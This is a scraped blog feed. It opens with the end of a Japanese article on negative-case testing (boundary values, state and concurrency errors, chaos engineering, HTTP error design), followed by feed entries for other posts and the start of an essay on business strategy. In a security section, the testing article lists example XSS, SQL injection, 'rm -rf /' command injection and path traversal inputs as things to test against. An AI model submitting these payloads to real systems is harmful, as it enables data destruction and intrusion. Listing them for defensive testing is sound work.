運にも大きな障害を経験していない人は「そこまでやる必要があるのか」と思います。これは良い悪いではなく、思考の枠組みそのものが異なるのです。だからこそ、チームとして、組織として「どこまでの異常を許容するのか」を明確にしておく必要があります。暗黙の了解ではなく、言語化する。そうしないと、「テストが多すぎる」「テストが足りない」という不毛な議論が続くことになります。では、本題に入りましょう。異常系テストとは異常系テストとは、システムが想定外の状況に遭遇したとき、適切にエラーハンドリングできるかを検証するテストです。正常系テストが「うまくいくパス」を確認するのに対し、異常系テストは「うまくいかないパス」を確認します。異常系と一口に言っても、その原因はさまざまです。「どこから異常が来るか」という視点で整理すると、4つの観点に分けられます。入力値の異常: ユーザーやクライアントから来ます。空文字、境界値超過、不正な形式など状態の異常: システム内部のデータに起因します。リソースが見つからない、すでに処理済み、権限不足など環境の異常: 外部依存に起因します。ネットワーク障害、DB接続失敗、ディスク容量不足など競合の異常: 並行処理に起因します。同時更新、デッドロック、レースコンディションなどこの順番には意味があります。入力値の異常は最も頻繁に発生し、テストも書きやすいです。状態の異常はビジネスロジックと密接に関わります。環境の異常はテストが難しいですが、本番では必ず起きます。競合の異常は最も見つけにくく、再現も難しいです。つまり、テストの書きやすさと、問題の発見しにくさは、おおむね逆の関係にあります。それぞれについて見ていきましょう。入力値の異常フォームに全角スペースだけを入力して送信したら、システムがエラーを吐いた。そんな経験はないでしょうか。あるいは、絵文字を含む名前を登録しようとしたら、データベースエラーが返ってきた。ユーザーは悪意を持っていたわけではありません。ただ、開発者が「想定していなかった」だけです。どれだけ想像力を働かせても、ユーザーは必ずその想像の外側から来ます。ユーザーからの入力は信用できません。これはセキュリティの基本原則ですが、テストにおいても同様です。境界値分析（Boundary Value Analysis）境界値分析は、ソフトウェアテストの古典的な技法です。入力値の境界付近でエラーが発生しやすいという経験則に基づいています。# 例: 文字数制限が255文字の場合- 255文字 → 成功するべき- 256文字 → エラーになるべき- 0文字（空文字） → 要件によるよくある境界値のテストケース：最大値・最小値最大値+1・最小値-1ゼロ負の値（許可されていない場合）この技法は同値分割法（Equivalence Partitioning）と組み合わせて使うことが多いです。同値分割法では、入力値を「同じ振る舞いをするグループ」に分割し、各グループから代表値を選んでテストします。たとえば「1〜255文字」「256文字以上」「0文字」の3グループに分け、それぞれの代表値と境界値をテストします。現代のAPI開発では、境界値分析の対象は数値入力を超えて拡張されています。APIのページネーション制限（page size=99, 100, 101）、リクエストペイロードサイズ制限、タイムアウト閾値、レートリミットの境界などが現代的なBVA対象です。空値の扱い境界値の中でも、特に扱いが難しいのが「空」という概念です。空値の扱いは設計上の判断が必要になります。 値  検討ポイント  空文字 \\"\\"  許容するか、エラーにするか  スペースのみ \\"   \\"  トリムするか、エラーにするか  NULL  必須項目か、オプショナルか  undefined  デフォルト値を使うか テストを書くことで、こうした設計の曖昧さが明確になることがあります。「空文字を許容するか」という問いに対して、チームで合意を取る機会になります。ここで気づくべき重要なことがあります。異常系テストの気付きにくい価値は、バグを見つけることではありません。設計を問い直すことです。「この入力が来たらどうするか」という問いを立てることで、仕様の穴が見えます。テストを書く行為そのものが、システムの堅牢性を高めています。テストが通るかどうかは、実は二次的な問題なのです。文字種と特殊文字空値に続いて、もう一つ厄介なのが文字種です。日本語を扱うシステムでは、文字種のテストが特に重要になります。カタカナ・半角カタカナ環境依存文字（㈱、①など）サロゲートペア（\uD842\uDFB7野家の「\uD842\uDFB7」など）絵文字これらの文字が入力されたとき、システムがどう振る舞うかを確認します。データベースの文字コード設定やAPIのエンコーディングによっては、予期しない動作をすることがあります。セキュリティ関連の入力ここまでは「意図しない入力」の話でした。しかし、世の中には「意図的に悪意のある入力」を送りつけてくる人もいます。セキュリティ関連の入力値テストは、インジェクション攻撃（悪意のあるコードを入力に紛れ込ませる攻撃）への耐性を確認します。OWASP Testing Guideは、このようなセキュリティテストの標準的な指針を提供しています。XSS（クロスサイトスクリプティング）: <script>alert(\'XSS\')<\/script> — Webページに悪意のあるスクリプトを埋め込む攻撃SQLインジェクション: \'; DROP TABLE users;-- — データベースを不正に操作する攻撃コマンドインジェクション: ; rm -rf / — サーバーで不正なコマンドを実行させる攻撃パストラバーサル: ../../../etc/passwd — 本来アクセスできないファイルを読み取る攻撃インジェクション攻撃への対策はセキュリティテストの領域でもありますが、異常系テストとして「不正な入力が来たときにシステムが適切にエラーを返すか」を確認しておくことは重要です。エラー推測（Error Guessing）という経験ベースの技法も有効です。過去のバグ傾向から共通パターン（NullPointerException、ゼロ除算、日時パース問題など）を識別し、重点的にテストします。AIとファジングによる入力値テストここまで紹介した技法は、人間がテストケースを考えるものでした。しかし、人間の想像力には限界があります。そこで注目されているのが、ランダムな入力を自動生成してバグを探すファジング（Fuzzing）です。冒頭で触れたGoogle OSS-FuzzのAI活用は、まさにこの領域での成果です。AIが生成したファズターゲットにより26件の脆弱性が発見され、OpenSSLに20年間潜伏していた欠陥も見つかりました。人間が「こういう入力が来るかも」と想像する範囲を超えて、AIが異常な入力パターンを生成します。www.theregister.comもう一つ、Property-based testing（性質ベーステスト）という手法も企業での採用が加速しています。従来のテストは「入力Aに対して出力Bが返る」という具体的なペアを書きます。Property-based testingでは「どんな入力に対しても、この性質が成り立つ」という形で定義します。たとえば「リストをソートして逆順にしても、要素数は変わらない」といった性質です。Python向けのHypothesisは週間300万ダウンロードを超え、numpyやastropyなどの科学ライブラリでバグを発見した実績があります。QuickCheck（Haskell）、fast-check（JavaScript）、proptest（Rust）など、各言語でエコシステムが成熟しています。入力値の異常は、ユーザーから直接来るものでした。次に見るのは、システムの内部で起きる異常です。状態の異常「さっきまで動いていたのに」。この言葉に覚えはないでしょうか。ユーザーが画面を開いている間に、別のユーザーがデータを削除します。システムの状態は常に変化しています。画面に表示された瞬間、それはもう過去です。リソースの状態に関するテストでは、以下のようなケースを考慮します。存在しないリソース存在しないIDでアクセスしたときに、適切なエラー（404 Not Foundなど）が返ることを確認します。削除済みリソース削除されたリソースに再度アクセスしたときの動作を確認します。ユーザーがブックマークしていたページが、管理者によって削除されていた。よくある話です。「404 Not Found」で終わりなのか、「このコンテンツは削除されました」と丁寧に伝えるのか。論理削除と物理削除では挙動が異なります。論理削除なら「削除済み」というステータスを返せます。物理削除ならレコード自体が存在しないため、404を返すことになります。どちらの設計を採用しているかで、テストの期待値も変わります。処理中のリソース処理中（アップロード中、変換中など）のリソースにアクセスしたときの動作を確認します。「まだ準備ができていない」ことをクライアントに適切に伝えられるか。不正な状態遷移状態遷移が定義されているシステムでは、不正な遷移を試みたときの動作を確認します。# 例: 注文のステータス遷移作成 → 確定 → 発送 → 完了# 不正な遷移作成 → 完了（確定と発送をスキップ）完了 → 作成（逆方向の遷移）入力値の異常、状態の異常は、どちらもアプリケーション内部の話でした。しかし、システムは単独で動いているわけではありません。次は、システムの外側から来る異常を見ていきます。環境の異常環境の異常は、テストが最も難しい領域です。開発環境では再現しにくいですが、プロダクション環境では必ず発生します。ローカルで動いたからといって、本番で動く保証はありません。開発環境は、ある意味で嘘をつきます。ネットワークは常に安定し、データベースは常に応答し、ディスクは無限にあります。そんな理想的な環境でテストしても、現実の障害には備えられません。だからこそ、どういう異常が起こりうるかを知っておくことが重要です。近年ではChaos Engineering（カオスエンジニアリング）という手法が注目されています。Netflixが提唱したこのアプローチでは、本番環境に意図的に障害を注入し、システムの回復力を検証します。AWS Fault Injection ServiceやAzure Chaos Studioといったクラウドサービスも登場しています。これは上級者向けの手法ですが、まずは以下のような基本的な異常パターンを理解しておきましょう。ネットワーク障害通信経路の遮断タイムアウトオンライン→オフラインの遷移対応方法としては、タイムアウト設定、リトライ、サーキットブレーカーなどがあります。サーキットブレーカーとは、外部サービスへのリクエストが連続して失敗したとき、一時的にリクエストを遮断する仕組みです。電気のブレーカーが過電流を検知して回路を遮断するのと同じ発想で、障害の連鎖を防ぎます。データベース障害DB応答不可コネクションプール枯渇デッドロック対応方法としては、コネクションプールの適切な設定、リトライ、タイムアウトなどがあります。外部サービス障害API応答不可レートリミット予期しないレスポンス形式対応方法としては、サーキットブレーカー、フォールバック、キャッシュなどがあります。リソース枯渇ディスク容量不足メモリ不足ファイルディスクリプタ枯渇リソース枯渇は、テストで再現するより監視とアラートで早期に検知する方が現実的です。とはいえ、リソースが枯渇したときにシステムがどう振る舞うか（gracefulに停止するか、エラーメッセージを出すか）は、設計段階で決めておく必要があります。カオスエンジニアリングの実践「本番環境に障害を注入する？ 正気か？」。最初は誰もがそう思います。しかし、問いを変えてみましょう。「本番で障害が起きたとき、それが予期せぬものであることと、計画されたものであること、どちらがマシか？」カオスエンジニアリングの市場規模は2025年に23.6億ドル、2030年には35.1億ドルに達すると予測されています。もはやニッチな手法ではなく、エンタープライズ標準になりつつあります。www.mordorintelligence.comKubernetes環境ではLitmusChaosとChaos Meshが代表的なツールです。LitmusChaosはCNCFインキュベーティングプロジェクトとして活発に開発が続いています。Chaos MeshはPodChaos、NetworkChaos、IOChaos、StressChaosなど多様な障害タイプを提供します。hub.litmuschaos.ioGameDay（計画的なカオス実験演習）の実践も広がっています。まず最小の爆発半径（障害の影響範囲）から開始し、単一コンテナ→サービス→ゾーンと段階的にスケールアップします。本番環境を最初のターゲットにしてはなりません。レジリエンスパターン環境の異常に備えるには、コードにレジリエンスパターンを組み込む必要があります。先に紹介したサーキットブレーカーに加え、以下のパターンが重要です。Bulkhead（バルクヘッド）: 船の隔壁のように、リソースを区画化して一部の障害が全体に波及することを防ぎますRetry with Exponential Backoff（指数バックオフ付きリトライ）: 失敗したら1秒後、2秒後、4秒後…と間隔を広げてリトライします。リトライストームを防止しながら一時的障害から回復しますこれらのパターンを実装したら、カオスエンジニアリングで実際に障害を注入し、期待通りに動作するか検証します。パターンを実装しただけでは不十分で、テストして初めて信頼できます。ここまで、入力値、状態、環境の異常を見てきました。最後に残るのは、最も厄介な異常です。複数のユーザーが同時にシステムを使うときに起きる問題、競合の異常です。競合の異常「ローカルでは動いたのに」。開発者なら誰もが経験するこの言葉の裏には、しばしば競合の問題が潜んでいます。開発環境では自分一人しかアクセスしません。しかし本番環境では、何百人ものユーザーが同時にボタンを押します。本番は、常に渋滞しています。その渋滞の中で、単体テストでは見えなかった問題が姿を現します。複数のユーザーやプロセスが同時にリソースにアクセスすると、競合が発生しえます。これは単体テストでは見つけにくく、負荷テストや本番環境で初めて発覚することも多いです。だからこそ、「競合が起きたらどうなるか」を事前に設計しておくことが重要です。同時更新典型的なシナリオを考えてみましょう。1. ユーザーAがデータを取得2. ユーザーBが同じデータを取得3. ユーザーAが更新を実行4. ユーザーBが更新を実行 → どうなるべきか？ユーザーBの更新時点で、データはすでにユーザーAによって変更されています。このとき、システムはどう振る舞うべきでしょうか。主な対応方法は3つあります。楽観的ロック: データ取得時にバージョン番号を記録し、更新時に照合します。バージョンが変わっていれば「誰かが先に更新した」と判断し、後から更新しようとした側にエラーを返します悲観的ロック: 更新する意思を示した時点で排他ロックを取得し、他者は同じデータを更新できなくなります。確実ですが、ロック待ちによる遅延が発生しえます最後の更新が勝つ: 競合を検出せず、後から来た更新で上書きします。シンプルですが、先の更新は失われますどの方法を採用するかは、ビジネス要件によります。在庫数のように「先の更新が失われると困る」データには楽観的ロックか悲観的ロック、ユーザーのプロフィールのように「最新の状態が正」でよいデータには最後の更新が勝つ方式、といった使い分けになります。ボタン連打UIにおいて、ユーザーがボタンを連打した場合の動作を確認します。「送信ボタンを押したけど反応がない。もう一度押そう」。ユーザーは待ってくれません。ネットワークが遅いとき、ボタンが反応しないとき、人は本能的に連打します。「購入する」ボタンを連打したら2回購入されてしまった、という事故は避けたいところです。対応方法としては、デバウンス（一定時間内の連続クリックを1回とみなす）や、送信中はボタンを無効化する二重送信防止の仕組みがあります。サーバー側でも、同一リクエストを検出するためにリクエストIDを使った冪等性の担保を検討します。ここまで、4種類の異常（入力値、状態、環境、競合）を見てきました。これらの異常が発生したとき、システムは何らかのエラーを返す必要があります。では、どのようなエラーを返すべきでしょうか。次は、エラーレスポンスの設計について考えていきます。エラーレスポンスの設計異常系テストでは、「エラーが起きないこと」ではなく「適切なエラーが返ること」を検証します。エラーレスポンスの設計は、クライアント側のエラーハンドリングに大きく影響します。適切なエラーを返せば、呼び出し側は何が起きたかを判断し、適切に対処できます。ステータスコードの使い分けステータスコードとは、サーバーがクライアント（ブラウザやアプリ）に返す3桁の数字です。この数字を見れば、リクエストが成功したのか、失敗したのか、何が原因なのかが分かります。HTTPの場合：400 Bad Request: 入力値が不正401 Unauthorized: 認証失敗（ログインが必要）403 Forbidden: 権限不足（ログイン済みだがアクセス権がない）404 Not Found: リソースが存在しない409 Conflict: 競合（同時更新など）429 Too Many Requests: レートリミット（リクエストが多すぎる）500 Internal Server Error: サーバー内部エラー503 Service Unavailable: サービス利用不可（メンテナンス中など）gRPCの場合（gRPCはGoogleが開発した高速な通信方式）：INVALID_ARGUMENT: 入力値が不正NOT_FOUND: リソースが存在しないALREADY_EXISTS: リソースが既に存在FAILED_PRECONDITION: 前提条件不成立PERMISSION_DENIED: 権限不足RESOURCE_EXHAUSTED: リソース枯渇セキュリティ観点でのエラー設計他ユーザーのリソースへのアクセスには、エラーコードの選び方に注意が必要です。ここには、多くの開発者が見落としている盲点があります。素直に考えると、「存在するが権限がない」なら403 Forbiddenを返したくなります。HTTPの仕様としては正しいです。しかし、これには問題があります。攻撃者がIDを総当たりで試したとき、403が返れば「このIDのリソースは存在する」と分かってしまいます。つまり、正しいエラーコードを返すことが、セキュリティホールになるという逆説です。そこで、他ユーザーのリソースへのアクセスには404 Not Foundを返すという設計があります。「存在するが権限がない」と「存在しない」を区別できないようにすることで、攻撃者に情報を与えません。GitHubのプライベートリポジトリも、この設計を採用しています。権限のないリポジトリにアクセスすると、「存在しない」と表示されます。これは「嘘をつく」のではなく、「必要以上の情報を与えない」という設計です。エラーメッセージは親切であるべきですが、攻撃者にも親切である必要はありません。異常の種類と、返すべきエラーレスポンスが分かりました。では、実際にどうやってテストを書けばいいのでしょうか。ここからは、異常系テストの書き方について説明します。テストの書き方期待するエラーの検証異常系テストで最も基本的なのは、「期待するエラーが返ること」の検証です。正常系では「期待する結果が返ること」を確認しますが、異常系では「期待するエラーが返ること」を確認します。# 例: 存在しないリソースへのアクセスで404が返ることを検証def test_get_not_found():    response = client.get(\\"/resources/nonexistent-id\\")    assert response.status_code == 404テストの独立性各テストは独立して実行できるようにします。テスト間でデータを共有しません。# テストごとに一意のIDを使用TEST_ID=\\"test-$(date +%s)\\"クリーンアップテスト終了後は作成したリソースを削除します。テストデータが残っていると、次回のテスト実行に影響を与える可能性があります。テストピラミッドにおける異常系テストMike Cohnの伝統的なテストピラミッド（ユニット→インテグレーション→E2E）では「各要件に対し少なくとも2つのテスト、1つは正常系、1つは異常系」が原則です。Kent C. Doddsの「Testing Trophy」モデルでは、インテグレーションテストを重視します。「テストがソフトウェアの使用方法に似ているほど、より多くの信頼を与える」という原則のもと、インテグレーションテストはユニットテストが見逃すエラー（コンポーネント間の相互作用問題）を捕捉します。AIによるテスト生成「テストケースを考えるのが面倒」「どこまでカバーすればいいか分からない」。そんな悩みを抱えたことはないでしょうか。AIによるテスト生成は、この問題に一つの解を与えます。NVIDIAのHEPHフレームワークはLLM（大規模言語モデル）を用いてドキュメントからテストを自動生成します。Diffblue CoverはJavaコードの静的解析からユニットテストを生成します。qodo（旧Codium）はコード動作を分析してエッジケースを含むテストケースを生成します。これらのツールはエラーシナリオ、境界条件、例外処理パスを自動的に導出します。ただし、AIが生成したテストをそのまま使うのは危険です。「何をテストすべきか」の判断は人間がすべきであり、AIはその実装を支援するツールに過ぎません。テストの質を検証する：Mutation Testingテストを書きました。カバレッジも高いです。しかし、そのテストは本当にバグを見つけられるのでしょうか。Mutation testing（変異テスト）は、コードに意図的なバグを埋め込み、テストがそれを検出できるか評価する手法です。たとえばif (x > 0)をif (x >= 0)に変更します。この変更をテストが検出できなければ、そのテストには穴があります。PITest（Java）、Stryker Mutator（JS/TS/C#）、cargo-mutants（Rust）などのツールがCI/CDへの統合を進めています。cargo-mutantsはRustConf 2024で発表され、ソースコード変更なしで任意のRustプロジェクトに適用できます。 speakerdeck.com異常系テストの優先順位すべての異常をテストする時間はありません。リスクベースで優先順位をつけます。Priority 1（毎スプリント）: セキュリティ敏感入力（SQLインジェクション、XSS）、金融・トランザクション操作、認証・認可障害Priority 2（毎リリース）: コアビジネス機能のエラーパス、統合ポイント障害、境界値違反Priority 3（定期テスト）: 複雑なエラーハンドリングフロー、二次機能のエッジケースPriority 4（メジャーリリース前）: 安定したレガシー機能、低トラフィック機能のエラーハンドリングまとめ異常系テストは「何が起きたら困るか」を事前に洗い出し、システムが適切に対処できることを検証する作業です。本記事で紹介した内容を振り返ると、以下の5点が重要になります。すべてをテストする必要はない - リスクの高い箇所に集中します。テストにもROIがあります。チームで「どこまでの異常を許容するか」を言語化しておきましょうAIとツールを活用する - ファジング、Property-based testing、Mutation testingなど、人間の想像力を超える異常を発見する手法があります。AIによるテスト生成も現実的な選択肢になりました環境の異常にはカオスエンジニアリング - 本番環境で必ず起きる障害を、事前に計画して注入します。レジリエンスパターン（サーキットブレーカー、バルクヘッド、指数バックオフ）を実装し、実際にテストしますセキュリティ観点を忘れない - エラーメッセージやエラーコードが情報漏洩につながることがあります。403と404の使い分けはその典型例ですテストを書くことで設計が明確になる - 「空文字を許容するか」「同時更新をどう扱うか」といった曖昧だった仕様が、テストを書く過程で具体化されます異常系テストは面倒に感じることもあります。しかし、プロダクション環境で障害が発生してから対処するコストに比べれば、事前にテストを書くコストは安いです。深夜2時のアラート対応、原因調査、ホットフィックス、ポストモーテム。そのすべてを、1つのテストが防いでくれることがあります。障害が起きたら、その教訓をテストとして残す。それが本当の意味での振り返りです。異常系テストは、将来の自分を助けるための投資です。3ヶ月後の深夜2時、アラートが鳴らなかったとき、過去の自分へ感謝するでしょう。明日からできること大げさに考える必要はありません。次にコードを書くとき、1つだけ試してみてください。「この処理が失敗したら、何が起きるか」を考える。その問いを立てるだけで、異常系テストは始まっています。APIを呼ぶコードを書いたら、「このAPIがタイムアウトしたらどうなるか」と考えます。データベースに保存するコードを書いたら、「保存に失敗したらどうなるか」と考えます。その問いに対する答えをテストとして書く。それだけでいいのです。完璧を目指す必要はありません。昨日より1つだけ、システムを堅牢にする。その積み重ねが、深夜のアラートを1回減らし、ユーザーの信頼を1つ守ります。今日書いた1つのテストが、3ヶ月後の深夜2時を救います。AIがテスト生成を支援してくれる時代だからこそ、この「問いを立てる力」は人間にしかできない価値になります。3ヶ月後の深夜2時。あなたのスマートフォンは静かなままです。アラートは鳴りません。それは偶然ではありません。過去のあなたが書いた1つのテストが、その夜の安眠を守っています。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。参考資料ソフトウェアテスト徹底指南書 〜開発の高品質と高スピードを両立させる実践アプローチ作者:井芹 洋輝技術評論社Amazon単体テストの考え方/使い方作者:Vladimir Khorikovマイナビ出版Amazon【この1冊でよくわかる】ソフトウェアテストの教科書　［増補改訂 第２版］作者:布施 昌弘,江添 智之,永井 努,三堀 雅也SBクリエイティブAmazonソフトウェアテスト技法練習帳 ~知識を経験に変える40問~作者:梅津 正洋,竹内 亜未,伊藤 由貴,浦山 さつき,佐々木 千絵美,高橋 理,武田 春恵,根本 紀之,藤沢 耕助,真鍋 俊之,山岡 悠,吉田 直史技術評論社Amazonテスト駆動開発作者:ＫｅｎｔＢｅｃｋオーム社Amazon知識ゼロから学ぶソフトウェアテスト 第3版 アジャイル・AI時代の必携教科書作者:高橋 寿一翔泳社Amazonフルスタックテスティング【リフロー型】 10のテスト手法で実践する高品質ソフトウェア開発作者:Gayathri Mohan翔泳社Amazonソフトウェア品質保証入門: 高品質を実現する考え方とマネジメントの要点作者:保田 勝通,奈良 隆正日科技連出版社Amazonソフトウェア品質保証の極意 ―経験者が語る、組織を強く進化させる勘所―オーム社Amazon生成AIによるソフトウェア開発 ―設計からテスト,マネジメントまでをすべて変革するLLM活用の実践体系―オーム社Amazon","isoDate":"2025-12-16T01:22:27.000Z","dateMiliSeconds":1765848147000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Cloud Spanner の記事を書きました (+ 技術的な蛇足)","link":"https://silasol.la/posts/2025-12-16-01_cloud-spanner/","contentSnippet":"Cloud Spanner のコアアーキテクチャについて，職場の Tech Blog 補足と技術的な余談 (Paxos, CAP 定理, NewSQL) をまとめました．","isoDate":"2025-12-16T00:00:00.000Z","dateMiliSeconds":1765843200000,"authorName":"Masaki Haga","authorId":"silasolla"},{"title":"クラウド破産回避ガイド - AWSコスト管理の実践","link":"https://zenn.dev/r4ynode/articles/aws-cost-management","contentSnippet":"要約AWSのコスト管理は「Billing and Cost Management」の機能を知るところから「AWS Budgets」も良いけど、「AWS Cost Anomaly Detection」も一緒に使うといいよ原因調査は、、がんばろう、、、（頑張るTipsは紹介します） はじめにAWSを利用し、高額な請求が来てクラウド破産する方々を見かけます。きっとこれからもそのような経験をする方は絶えないでしょう。原因としてサービスの多さやクラウドの料金体系の複雑さが挙げられます。これを真に理解するには時間を要し面倒に思えますが、すべてを理解しなくても事前に対策することは容...","isoDate":"2025-12-15T22:00:06.000Z","dateMiliSeconds":1765836006000,"authorName":"Reito Koike","authorId":"reito"},{"title":"PostgreSQLのインデックス作成におけるパラメータの影響の調査","link":"https://zenn.dev/nnaka2992/articles/performance_measurement_on_pg_index_creation","contentSnippet":"このブログは3-shake Advent Calendar 2025 およびPostgreSQL Advent Calendar 2025のクロスポストです。PostgreSQLのインデックス作成のパフォーマンスには下記の2つのパラメータが特に大きく影響する。maintenance_work_memほとんどのインデックスメソッドにおいて、インデックス作成速度はmaintenance_work_memの設定に依存します。 より大きな値を設定すると、インデックス作成に必要となる時間が短縮されます。 ただし、実際に使用できるメモリ量を超えるほど大きくすると、マシンがスワップ...","isoDate":"2025-12-15T15:43:00.000Z","dateMiliSeconds":1765813380000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Langfuseに入門しないか？ ~ローカルホストで使ってみよう~","link":"https://zenn.dev/akasan/articles/langfuse_localhost","contentSnippet":"今回からLangfuseも取り扱っていこうと思います。Langfuseを利用することで、LLMの挙動をトレースすることができます。 Langfuseとは？Langfuseは、オープンソースのLLMエンジニアリングプラットフォームです。チームがLLMアプリケーションを共同でデバッグや分析、反復開発するのを支援してくれます。また、プラットフォームのすべての機能はネイティブに統合されており、開発ワークフローを加速します。Langfuseはオープンで、セルフホスト可能、そして拡張性に優れています。https://langfuse.com/docs主なインテグレーションについては以下にま...","isoDate":"2025-12-15T12:39:39.000Z","dateMiliSeconds":1765802379000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"おい、戦略を語れ","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/15/130000","contentSnippet":"はじめに会議室で誰かが「戦略」と言った瞬間、空気が変わる。みんなの背筋が伸びる。うなずきが深くなる。誰かがおもむろにホワイトボードの前に立ち、矢印を描き始める。私も「なるほど」という顔をしてみる。眉間にしわを寄せ、顎に手を当て、いかにも深く考えているふうを装う。会議室にいる全員が、突然「戦略を理解している側の人間」になる。ただ、私は知っている。この部屋にいる何人かは、私と同じことを思っているはずだ。「で、結局、何をするの？」言えない。絶対に言えない。「戦略」という言葉が持つ重厚感に押しつぶされて、そんな素朴な疑問は喉の奥に引っ込んでしまう。分かっていないことがバレたら終わりだ。「あいつ、戦略を理解していない」というレッテルを貼られたら、もうこの会議室での発言権はない。だから黙る。黙って、賢そうな顔を続ける。不思議なのは、誰もが同じ演技をしているように見えることだ。部長も、課長も、隣に座っている同僚も。みんな「戦略」という言葉に真剣な顔で向き合っている。でも、その「真剣な顔」は、本当に理解しているから出てくる表情なのだろうか。それとも、理解していないことを悟られないための防衛反応なのだろうか。私には、区別がつかない。会議が終わると、みんな自分のデスクに戻っていく。誰も「さっきの戦略、よく分からなかったね」とは言わない。私も言わない。言ったら負けだ。何に負けるのかは分からないけど、とにかく負ける気がする。だから、分かったふりを続ける。これは、そういう自分への苛立ちから始まった文章だ。「戦略的に考えろ」と言われるたびに、心の中で「戦略的って何だよ」と毒づいてきた。でも調べなかった。調べるのが怖かった。調べて、やっぱり分からなかったらどうしよう。そんな不安があった。聞くこともできなかった。「戦略って何ですか」なんて質問は、新卒1年目ならまだ許される。でも、何年も働いてきた人間が今さら聞けるわけがない。だから分かったふりを続けてきた。その居心地の悪さを、いい加減どうにかしたかった。だからこの文章を書いている。誰かのためではない。自分のためだ。「おい、戦略を語れ」という言葉は、会議室の誰かに向けているようで、実は鏡の中の自分に向けている。お前は本当に分かっているのか。分かったふりをしているだけじゃないのか。その問いに、いい加減決着をつけたかった。戦略という言葉の氾濫私たちの周りには、「戦略」という言葉が溢れている。経営戦略。マーケティング戦略。販売戦略。顧客戦略。人材戦略。DX戦略。グローバル戦略。デジタル田園都市国家構想総合戦略。こんなに幅広く使われている「戦略」だが、その核心が何なのかと聞かれると、答えられない。いや、答えられないだけならまだいい。答えが人によって違いすぎる。ある人は言う。「戦略とは、目標を達成するための手段だ」。別の人は言う。「戦略とは、ビジョンを実現するための計画だ」。また別の人は言う。「戦略とは、競合に勝つための差別化だ」。どれも間違ってはいない。しかし、どれも正しくはない。なぜなら、これは戦略の「結果」であって、戦略の「核心」ではないからだ。戦略会議で何が起きているか、もう一度見てみよう。「今期の戦略は、売上を前年比130%にすることです」。これは戦略ではない。目標だ。どうやって達成するのかは、何も語られていない。「我々の戦略は、顧客第一、品質重視、イノベーション推進です」。これも戦略ではない。スローガンだ。具体的に何をするのかは、何も示されていない。「我々のマーケティング戦略は、デジタルチャネルの強化、SNS活用の拡大です」。これも戦略ではない。施策の羅列だ。なぜその打ち手なのか、どうつながっているのか、何が問題でそれがどう解決するのかは説明されていない。そして、最悪なのは、これらを「悪い戦略」と呼ぶことさえ正しくないということだ。悪い戦略とは、内部の対立を曖昧にするための妥協の産物である、という指摘がある。経営会議で、営業部と開発部が対立する。営業は「もっと新機能を」と言う。開発は「品質を優先すべき」と言う。すると、誰かが言う。「では、両方やりましょう。それが我々の戦略です」。これは妥協だ。誰も傷つけないための八方美人だ。でも、これを「戦略」と呼んではいけない。なぜなら、戦略とは、選択だからだ。何をやるかを決めることではない。何をやらないかを決めることだ。しかし、私たちは選択できない。なぜか。もちろん、個人の心理もある。選択することは、責任を負うことだ。「これをやる」と決めた人間は、それが間違っていた時、責任を取らなければならない。だから、選択を避ける。全部やると言えば、誰も傷つかない。ただ、問題は個人の心理だけではない。組織の構造が、選択を妨げている。まず、インセンティブの問題がある。営業部長は営業の数字で評価される。開発部長は開発の成果で評価される。全社最適より部門最適が優先される構造になっている。「うちの部門の予算を削るな」という力学が働く。次に、権限の曖昧さがある。誰が「やらない」と決める権限を持っているのか。多くの組織で、これが不明確だ。だから、誰も決めない。決めなければ、責任を問われない。また、評価制度との不整合がある。「やらないと決めた」ことは、評価されにくい。成果として見えないからだ。「100のことをやって80点」より「30に絞って95点」の方が戦略的には正しい。しかし、評価制度が前者を高く評価することがある。だからといって、個人の責任がないわけではない。選択する勇気は必要だ。ただ、勇気だけで組織を変えることはできない。構造を変えなければ、選択は起きない。「全部やる」は、個人の弱さであると同時に、構造の帰結でもある。選択を避け、妥協を繰り返す。その結果、戦略という言葉は、中身のない器になった。何を入れても受け入れる、便利な箱になった。目標を入れる。スローガンを入れる。希望を入れる。妥協を入れる。蓋を閉じて、「戦略」というラベルを貼る。これが、私たちが「戦略」と呼んでいるものの正体なのだろう。この空洞さは、どの立場にいても感じることがあるだろう。ただ、私のように技術寄りの立場にいると、余計に気になることがある。技術顧問として呼ばれているのに、いつの間にか「経営戦略」のスライドを見せられている。自分はシステムのアーキテクチャについて聞かれると思っていたのに、気づくと「売上130%」のスライドの前に立たされている。その「戦略」がどのレイヤーの話なのか、技術側から見るとよくわからない。事業の話なのか、組織の話なのか、プロダクトの話なのか。全部が「戦略」という言葉で括られている。しかし、だからといってエンジニアが戦略と無縁でいられるわけではない。プロダクトのどこにリソースを割くか。どの技術的負債を今返し、どれを後回しにするか。このアーキテクチャで将来の拡張性を取るか、今のシンプルさを取るか。これはすべて戦略的な判断だ。経営会議に出なくても、コードを書いていても、私たちは日々、戦略的な選択をしている。だからこそ、「戦略とは何か」を理解することは、エンジニアにとっても他人事ではない。私自身、最近作った資料を振り返ることがある。「戦略」と書いたスライド。本当に「解決すべき最重要課題と、その解き方」になっていたか。目標やスローガン、施策の羅列に留まっていなかったか。正直、自信がない。核心を見極める戦略を一言で表すなら、こうなる。「戦略とは、解決可能な最重要課題を見極め、それを解決する方法を見つけることだ」。シンプルだ。しかし、深い。まず、「解決可能な最重要課題」とは何か。組織が直面している問題は無数にある。しかし、すべてが同じ重さではない。ある問題を解決すると、他の問題も連鎖的に解決に向かう。そういう問題がある。それが「核心的な課題」だ。技術選定を考えてみよう。新しいプロジェクトを始める時、検討すべきことは無数にある。言語は何にするか。フレームワークは何を使うか。データベースは何が適切か。インフラはどう構成するか。すべて重要だ。ただ、すべてを同時には最適化できない。ここで、核心を見極める必要がある。たとえば、「チームの習熟度」が核心だとする。どんなに優れた技術でも、チームが使いこなせなければ意味がない。だから、チームが慣れている言語を選ぶ。すると、立ち上がりが早くなり、バグも減り、メンテナンスも楽になる。1つの核心を押さえたら、他の問題も動き始めた。戦略も同じだ。核心的な課題を見つけ、そこにリソースを集中させる。戦略とは、この課題を見つけることから始まる。会社が直面している問題は無数にある。売上が伸びない。競合が強い。人材が足りない。技術が古い。すべて問題だ。すべて解決したい。だが、すべてを同時に解決できない。だから、見極める。どれが核心的な課題なのか。どれを解決すれば、他の問題も動き始めるのか。私が関わったある組織で、プラットフォームエンジニアリングチームを立ち上げようとした時、無数の技術的課題があった。どれも難しい。どれも重要だ。Kubernetesの運用。CI/CD